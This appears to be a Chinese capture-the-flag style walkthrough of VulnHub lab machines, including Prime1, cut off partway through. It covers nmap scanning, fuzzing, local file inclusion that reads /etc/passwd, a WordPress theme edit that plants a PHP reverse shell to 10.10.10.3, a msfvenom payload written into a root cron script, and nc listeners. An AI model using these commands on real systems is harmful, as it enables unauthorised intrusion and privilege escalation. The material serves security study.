+<p><strong>找找自动任务一般是类似于  crontab  样式</strong>	<code>ls -liah cr*</code></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131923.png" alt="image-20251029194652283"></p>
+<p><strong>直接 cat crontab</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135000543.png" alt="image-20251029194745378"></p>
+<ul>
+<li>**这是 **<strong>系统默认时间表</strong>，没看到任何后门或恶意命令。</li>
+<li><strong>如果你想****提权</strong>，需要检查：<ul>
+<li><code>/etc/cron.hourly/</code>、<code>/etc/cron.daily/</code> … 这些目录里有没有<strong>可写的脚本</strong>；</li>
+<li><code>/etc/cron.d/</code> 下有没有<strong>自定义文件</strong>；</li>
+<li>**普通用户自己的 **<code>crontab -l</code>；</li>
+<li><strong>或者 systemd timer 等新型定时机制。</strong></li>
+</ul>
+</li>
+</ul>
+<p>**一句话：**<strong>这份 crontab 本身没漏洞，继续翻别的目录&#x2F;文件才行。</strong></p>
+<p><strong>多次翻找 发现 cron.d 目录下</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135001486.png" alt="image-20251029195014448"></p>
+<p><strong>automate 这个文件的指令就是：每分钟以 root 权限，通过 python，来执行这个 python 文件</strong></p>
+<p><strong>那我们就把想执行的命令放在 connect.py</strong></p>
+<p><strong>既然是 py 文件，我们就用 msfvenom</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p cmd/unix/reverse_python lhost=10.10.10.3 lport=444 -f raw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131924.png" alt="image-20251029200053776"></p>
+<p><strong>因为我们是直接放在文件里，就不用外面的 python 了</strong></p>
+<p><strong>接下来改 connect.py</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135001887.png" alt="image-20251029200218279"></p>
+<p><strong>O 新启一行  然后 esc :  wq</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135001925.png" alt="image-20251029200337650"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135003009.png" alt="image-20251029200401152"></p>
+<p><strong>可以 cat 看一下是否加上去</strong></p>
+<p><strong>记得打开监听</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131925.png" alt="image-20251029200539075"></p>
+<h3 id="获得-root-权限"><a href="#获得-root-权限" class="headerlink" title="获得 root 权限"></a>获得 root 权限</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135003868.png" alt="image-20251029200605902"></p>
+<p><strong>dpkg -l 可以找到是否安装了 python ，低版本 ubuntu</strong></p>
+<p><strong>获得交互式 shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131926.png" alt="image-20251029200731415"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131927.png" alt="image-20251029200751697"></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131928.png" alt="image-20251029201058329"></p>
+<h1 id="Prime1-信息收集和分析能力的试炼-解法一"><a href="#Prime1-信息收集和分析能力的试炼-解法一" class="headerlink" title="Prime1 - 信息收集和分析能力的试炼-解法一"></a>Prime1 - 信息收集和分析能力的试炼-解法一</h1><blockquote>
+<p><strong>靶机精讲之 Prime1，vulnhub 靶机，信息收集和分析能力的试炼，可以先盲打，看能否按图索骥。中间还是涉及模糊测试、wordpress 利用，常规打法，但也需要扎实的基本功。提权可用内核提权。</strong></p>
+</blockquote>
+<h2 id="nmap-扫描-1"><a href="#nmap-扫描-1" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><h3 id="主机发现-2"><a href="#主机发现-2" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.10.10.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135005688.png" alt="image-20251104191952280"></p>
+<h3 id="min-rate-端口扫描"><a href="#min-rate-端口扫描" class="headerlink" title="min-rate 端口扫描"></a>min-rate 端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 10.10.10.22</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131929.png" alt="image-20251104192103137"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 10.10.10.22 -oA 文件名</span><br><span class="line">将扫描结果保存在文件中</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135006439.png" alt="image-20251104192207718"></p>
+<h3 id="详细信息扫描-2"><a href="#详细信息扫描-2" class="headerlink" title="详细信息扫描"></a>详细信息扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p22,80 10.10.10.22</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131930.png" alt="image-20251104192344029"></p>
+<p><strong>-sT  TCP 扫描</strong></p>
+<p><strong>-sV 详细版本信息</strong></p>
+<p><strong>-sC 脚本</strong></p>
+<p><strong>-O 靶机的操作系统</strong></p>
+<h3 id="UDP-扫描-2"><a href="#UDP-扫描-2" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="" cid="n1055" mdtype="fences"><br/></pre>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135006634.png" alt="image-20251104192729299"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135006692.png" alt="image-20251104192801275"></p>
+<h3 id="漏洞脚本扫描-1"><a href="#漏洞脚本扫描-1" class="headerlink" title="漏洞脚本扫描"></a>漏洞脚本扫描</h3><p><strong>时间可能稍长</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln  -p22,80 10.10.10.22</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135007730.png" alt="image-20251104203522164"></p>
+<h2 id="WEB-渗透-1"><a href="#WEB-渗透-1" class="headerlink" title="WEB 渗透"></a>WEB 渗透</h2><p><strong>先打开浏览器访问一下，发现只有一张图片</strong></p>
+<h3 id="第一点，看看页面标题，和图片内容"><a href="#第一点，看看页面标题，和图片内容" class="headerlink" title="第一点，看看页面标题，和图片内容"></a>第一点，看看页面标题，和图片内容</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131931.png" alt="image-20251104193253512"></p>
+<p><strong>HacknPentest：英语中 n 可以是 and 的缩写  所以译为 破解和渗透</strong></p>
+<h3 id="第二点，看源码-F12"><a href="#第二点，看源码-F12" class="headerlink" title="第二点，看源码 F12"></a>第二点，看源码 F12</h3><p><strong>也没有什么有用信息 hnp 是 HacknPentest 首字母</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135007965.png" alt="image-20251104193450125"> <img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135008523.png" alt="image-20251104193514585"></p>
+<h3 id="第三点，dirb-目录爆破"><a href="#第三点，dirb-目录爆破" class="headerlink" title="第三点，dirb 目录爆破"></a>第三点，dirb 目录爆破</h3><blockquote>
+<p><strong>gobuster    feroxbuster    dirb</strong>  这三个都可以用，算法稍有差别，但功能差不多，实在不行了：<strong>1，换一个工具  2，了解一下相关工具的详细参数</strong></p>
+<p><strong>查看帮助</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--help                          |||           man dirb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135008835.png" alt="image-20251104194319570"></p>
+</blockquote>
+<p><strong>用 dirb 对 10.10.10.22 进行目录爆破</strong></p>
+<p><strong>发现有****非常规的 dev 目录</strong> 和一些其他目录</p>
+<blockquote>
+<p><strong>可以看到 dirb 默认扫描可以扫描多级目录</strong></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135008932.png" alt="image-20251104195152096"></p>
+<p><strong>有许多 wordpress 的默认目录，说明可能使用了 wordpress 内容管理系统</strong></p>
+<p>**先访问一下 dev 目录，发现文本：**<strong>让我们非常努力的用工具深挖</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131932.png" alt="image-20251104195523228"></p>
+<p><strong>保存一下</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget http://10.10.10.22/dev -O wenjianming</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135010153.png" alt="image-20251104195746054"></p>
+<blockquote>
+<p><strong><code>wget</code> 是一个非交互式的命令行下载工具</strong>，支持 HTTP、HTTPS 和 FTP 协议，常用于从网络上下载文件。</p>
+</blockquote>
+<h3 id="dirb-扫描文件"><a href="#dirb-扫描文件" class="headerlink" title="dirb 扫描文件"></a>dirb 扫描文件</h3><p><strong>因为刚才的&#x2F;dev 让我们努力的深挖，试验</strong></p>
+<p><strong>一般 dirb 只扫描目录，可以指定一些文件来扫，需要指定文件扩展名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.22 -X .zip,.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131934.png" alt="image-20251104200325069"></p>
+<p><strong>发现新的结果 secret.txt</strong></p>
+<p><strong>提取一下</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.22/secret.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135010593.png" alt="image-20251104200546808"></p>
+<blockquote>
+<p><strong>看起来你掌握了一些秘密。</strong> <strong>好吧，我只是想帮你一把。</strong> <strong>对你发现的每一个 PHP 页面再多做点模糊测试（fuzz）。</strong> <strong>如果你找到了正确的参数，就按下面的步骤继续。</strong> <strong>如果你还是卡住了，</strong> <strong>从这里学一个基础工具，它对 oscP 很有用：</strong></p>
+<p><strong><a id="fig3"></a></strong></p>
+<p><strong>&#x2F;&#x2F; 查看 location.txt，你就会知道下一步该怎么走 &#x2F;&#x2F;</strong></p>
+</blockquote>
+<p><strong>让我们在找到的 php 上做一些模糊测试（渗透测试很常见）</strong></p>
+<p><strong>可以打开他给的链接看一下是一个 web 模糊测试的程序</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135011016.png" alt="image-20251104201122083"></p>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th><strong>类型</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>目录模糊测试</strong></td>
+<td><strong>扫描隐藏目录或文件（如</strong><code>/admin</code>,<code>/backup.zip</code>）</td>
+</tr>
+<tr>
+<td><strong>参数模糊测试</strong></td>
+<td><strong>探测隐藏参数（如</strong><code>?debug=1</code>,<code>?test=true</code>）</td>
+</tr>
+<tr>
+<td><strong>扩展名模糊测试</strong></td>
+<td><strong>测试不同文件扩展名（如</strong><code>.bak</code>,<code>.old</code>,<code>.php~</code>）</td>
+</tr>
+<tr>
+<td><strong>子域模糊测试</strong></td>
+<td><strong>发现未公开子域名（如</strong><code>dev.example.com</code>）</td>
+</tr>
+<tr>
+<td><strong>虚拟主机模糊测试（Vhost）</strong></td>
+<td><strong>通过构造 Host 头发现虚拟主机</strong></td>
+</tr>
+<tr>
+<td><strong>递归模糊测试</strong></td>
+<td><strong>对发现的目录继续深入模糊测试</strong></td>
+</tr>
+</tbody></table>
+<h3 id="工具支持"><a href="#工具支持" class="headerlink" title="工具支持"></a><strong>工具支持</strong></h3><ul>
+<li><strong>常用工具如：</strong><code>ffuf</code>、<code>wfuzz</code>、<code>burp intruder</code>、<code>JBroFuzz</code>、<code>nuclei</code> 等<br><strong>。</strong></li>
+<li><strong>工具通常支持自定义字典、过滤响应、递归测试等功能。</strong></li>
+</ul>
+</blockquote>
+<h3 id="那我们先列出所有找到的-php"><a href="#那我们先列出所有找到的-php" class="headerlink" title="那我们先列出所有找到的 php"></a>那我们先列出所有找到的 php</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.22 -X .php </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131935.png" alt="image-20251104203115681"></p>
+<p><strong>发现根目录下有两个（虽然 wordpress 里面也有好多 php，但根目录下的明显更重要）</strong></p>
+<p><strong>其中 index.php 不出意外就是我们原来的主页面</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135011737.png" alt="image-20251104203355541"></p>
+<p><strong>根据给我们的****wfuzz 程序</strong></p>
+<p><strong>-c 分颜色</strong></p>
+<p><strong>-w 使用的字典</strong></p>
+<p><strong>–hc 筛选器 一开始不用，结果出来之后再用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http//10.10.10.22/image.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131936.png" alt="image-20251104204241468"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131937.png" alt="image-20251104204504057"></p>
+<p><strong>结果非常长，如何筛选？  出现非常多次的都是没什么用的，，具体筛选参数可以–help 找</strong></p>
+<p><strong>–hh 隐藏 char</strong></p>
+<p><strong>–hw 隐藏 word</strong></p>
+<p><strong>在过滤掉出现多次的信息后，发现****image.php 什么都没有</strong></p>
+<p><strong>因为****让我们测试所有 php 文件</strong>，那只能试试本以为没用的 <strong>index.php</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135013097.png" alt="image-20251104204945408"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135013645.png" alt="image-20251104205006749"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135013989.png" alt="image-20251104205147404"></p>
+<p><strong>找到了“file”参数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl http://10.10.10.22/index.php?file</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135014673.png" alt="image-20251104205554166"></p>
+<p><strong>发现有东西，说我们挖到错误文件了。 保存</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135014702.png" alt="image-20251104205755667"></p>
+<p>**那正确的文件是什么？   **<a href="#fig3">ctrl 加左键点击我</a>     我们常见的?file 后面都是要跟&#x3D;xx 的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.22/index.php?file=location.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131938.png" alt="image-20251104210551339"></p>
+<p><strong>让我们在其他 php 页面上****用’ secrettier360 ‘参数</strong>  没说具体是什么</p>
+<blockquote>
+<p><strong>截屏保存</strong> <img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135015370.png" alt="image-20251104210956642"></p>
+<p><strong>如何打开</strong><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135015680.png" alt="image-20251104211123470"></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135016522.png" alt="image-20251104211313961"></p>
+<p><strong>没东西</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131939.png" alt="image-20251104211356840"></p>
+<p><strong>得到了****正确参数</strong>，但<strong>没说要干啥</strong>（#是否为 wfuzz 的参数呢？可以自己试一下）</p>
+<h2 id="尝试本地文件包含并利用"><a href="#尝试本地文件包含并利用" class="headerlink" title="尝试本地文件包含并利用"></a>尝试本地文件包含并利用</h2><p><strong>可以指定这个文件，那还可以看哪些文件呢？</strong></p>
+<p><strong>因为这是一台 linux 机器，试试能不能本地文件包含</strong></p>
+<blockquote>
+<p><strong>[!IMPORTANT]</strong></p>
+<p><strong>文件包含中</strong><strong>..&#x2F;尽可能的多</strong>，反正到了根目录加再多也是一样的</p>
+<p><code>../</code> 是<strong>相对路径</strong>中的“上一级目录”符号。</p>
+<p><strong>例如：</strong></p>
+<ul>
+<li><code>../../../etc/passwd</code> 表示向上跳三级目录，再进入 <code>etc/passwd</code>。</li>
+<li>**如果当前目录是 **<code>/var/www/html</code>，那么：<ul>
+<li><code>../</code> → <code>/var/www</code></li>
+<li><code>../../</code> → <code>/var</code></li>
+<li><code>../../../</code> → <code>/</code></li>
+<li><code>../../../../</code> → 仍然是 <code>/</code>（根目录的父目录是自己）</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<hr>
+<blockquote>
+<p><code>/etc/passwd</code> 不是目录，而是一个<strong>纯文本文件</strong>，位于 <code>/etc/</code> 目录下。它是 Linux&#x2F;Unix 系统中<strong>最核心的用户账号数据库之一</strong>，<strong>任何人都可以读取</strong>（权限 644），但只能由 root 写入</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl http://10.10.10.22/image.php?secrettier360=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135017028.png" alt="image-20251104212000981"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135017542.png" alt="image-20251104211844735"></p>
+<p><strong>1000</strong><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135017658.png" alt="image-20251105192648661"></p>
+<p><strong>用户名   :密码 x（说明放在 shadow 文件里 ）: 用户 ID : 组 ID：简单的描述&#x2F;bash 环境</strong></p>
+<p><strong>victor   :  x                                                     :1000     :1000 :&#x2F; &#x2F; bash</strong></p>
+<p><strong>nologin 就是没用 bash 环境，一般没用</strong></p>
+<p><strong>其中 saket 中有提示他的给定目录中有 password</strong></p>
+<p>**1001 **<img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135018390.png" alt="image-20251105193053038"></p>
+<blockquote>
+<ul>
+<li><strong>UID 1000 及以上</strong>：** **大多数现代 Linux 发行版（如 Ubuntu、Debian、CentOS 7+、Fedora 等）<strong>默认从 UID 1000 开始分配新创建的普通用户</strong>。<ul>
+<li><strong>例如：你安装系统时创建的第一个用户，UID 通常是 1000。</strong></li>
+<li><strong>之后每新建一个用户，UID 递增（1001、1002……）。</strong></li>
+</ul>
+</li>
+<li><strong>系统用户保留范围</strong>：** <strong>UID 0–999 通常保留给</strong>系统用户**（如 <code>root</code>、<code>daemon</code>、<code>www-data</code>、<code>mysql</code> 等），这些用户由系统或软件包在安装时自动创建，<strong>不会用于登录</strong>。</li>
+</ul>
+</blockquote>
+<p><strong>按照提示走</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl http://10.10.10.22/image.php?secrettier360=../../../../../../../../../../home/saket/password.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135018784.png" alt="image-20251105193652164"></p>
+<p><strong>他说我们****最终</strong>找到了正确的参数  <code>follow_the_ippsec</code>  这条路貌似到头了</p>
+<p>** 该密码用来：ssh？ wordpress？ **</p>
+<h2 id="ssh-试一下"><a href="#ssh-试一下" class="headerlink" title="ssh 试一下"></a>ssh 试一下</h2><p><strong>两个用户   saket  victor</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh saket@10.10.10.22</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135018956.png" alt="image-20251105195824850"></p>
+<p><strong>都不行</strong></p>
+<p><strong>接下来 w 们看看目录扫描里面还剩几个根目录试一下</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135019110.png" alt="image-20251105194554198"></p>
+<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="&#x2F;wordpress"></a>&#x2F;wordpress</h2><p><strong>这是一套用户管理系统，打开以后（提示 victor 用户）</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131940.png" alt="image-20251105194715494"></p>
+<p><strong>在钟馗之眼上可以看到，wordpress 是一套非常著名常用的 web 用户管理系统</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135020120.png" alt="image-20251105200020244"></p>
+<p><strong>肯定存在****常见漏洞和利用方式</strong></p>
+<h3 id="常用的对-CMS-的扫描器-wpscan"><a href="#常用的对-CMS-的扫描器-wpscan" class="headerlink" title="常用的对 CMS 的扫描器 wpscan"></a>常用的对 CMS 的扫描器 wpscan</h3><p><strong>–help</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135020629.png" alt="image-20251105200530846"></p>
+<p><strong>用户扫描（因为我们知道密码了）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wpscan --url http://10.10.10.22/wordpress -e u</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131941.png" alt="image-20251105200548038"></p>
+<p><strong>这里****也</strong>找到了 victor 用户（可以直接浏览网页，这样可能更全面）</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135021543.png" alt="image-20251105200819604"></p>
+<h3 id="尝试登录-1"><a href="#尝试登录-1" class="headerlink" title="尝试登录"></a>尝试登录</h3><p><strong>地址：</strong></p>
+<p>**百度搜索   **<img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135021724.png" alt="image-20251105201117238"></p>
+<p>**之前的 dirb 结果  **<img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135021854.png" alt="image-20251105201313103"></p>
+<p><strong>经验…    等等都可以</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131942.png" alt="image-20251105201127539"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.22/wordpress/wp-admin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131943.png" alt="image-20251105201155947">      victor     follow_the_ippsec</p>
+<h3 id="成功登录-Wordpress，获得后台权限"><a href="#成功登录-Wordpress，获得后台权限" class="headerlink" title="成功登录 Wordpress，获得后台权限"></a>成功登录 Wordpress，获得后台权限</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135023199.png" alt="image-20251105201438386"></p>
+<h4 id="利用方式套路化"><a href="#利用方式套路化" class="headerlink" title="利用方式套路化"></a>利用方式套路化</h4><h5 id="一，插件"><a href="#一，插件" class="headerlink" title="一，插件"></a>一，插件</h5><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135023486.png" alt="image-20251105202026489"></p>
+<p><strong>上传插件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131944.png" alt="image-20251105201923634"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135024091.png" alt="image-20251105202107610"></p>
+<p><strong>一般插件这里要上传一个 zip 格式的，可以****先试试能不能上传</strong> zip 文件再构造 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip shell xxx.xx</span><br><span class="line">zip 压缩文件名  源文件.格式</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135024367.png" alt="image-20251105202453169"></p>
+<p><strong>发现上传失败，说明这个 bug 被修复了，没有写权限</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131945.png" alt="image-20251105202632928"></p>
+<h5 id="二，主题"><a href="#二，主题" class="headerlink" title="二，主题"></a>二，主题</h5><p><strong>1.试一下</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135025372.png" alt="image-20251105202235570"></p>
+<p><strong>2.主题编辑器</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131946.png" alt="image-20251105202900867"></p>
+<p><strong>看有没有写权限（经验）</strong></p>
+<p><strong>一般来说，能有写权限，下拉底下都有一个可以****提交的按钮</strong></p>
+<p><strong>先找 php 文件</strong>，如果不是 php 文件，上传上去也没有执行权限和可执行性</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135025744.png" alt="image-20251105203330304"></p>
+<p><strong>这都是没有写权限的</strong></p>
+<p><strong>我们在 inc 里找到可提交的</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135026160.png" alt="image-20251105204720355"></p>
+<p><strong>写反弹 shell  payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.3/443 0&gt;&amp;1&#x27;&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135026326.png" alt="image-20251105203728745"></p>
+<p>**提交   **<img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131947.png" alt="image-20251105203809625"></p>
+<p><strong>之后就是打开这个页面了</strong></p>
+<p><strong>怎么找网页所在网址？</strong></p>
+<p><strong>1：经验          2：开源网站可以去网上找       3.写 payload 的页面上暴露了上一级目录</strong></p>
+<p><strong>访问</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.22/wordpress/wp-content/themes/twentynineteen/secret.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135027199.png" alt="image-20251105204420394"></p>
+<p><strong>本机打开监听</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135027696.png" alt="image-20251105204017666"></p>
+<p><strong>反弹 shell 成功</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135027747.png" alt="image-20251105205009837"></p>
+<h2 id="由此获得初始系统-shell"><a href="#由此获得初始系统-shell" class="headerlink" title="由此获得初始系统 shell"></a>由此获得初始系统 shell</h2><p><strong>查看信息，确定是我们的目标靶机</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135028061.png" alt="image-20251105205535571"></p>
+<p><strong>查看用户权限</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131948.png" alt="image-20251105205636840"></p>
+<blockquote>
+<h4 id="root-NOPASSWD-home-saket-enc"><a href="#root-NOPASSWD-home-saket-enc" class="headerlink" title="(root) NOPASSWD: /home/saket/enc"></a><code>(root) NOPASSWD: /home/saket/enc</code></h4><p><strong>这意味着：</strong></p>
+<blockquote>
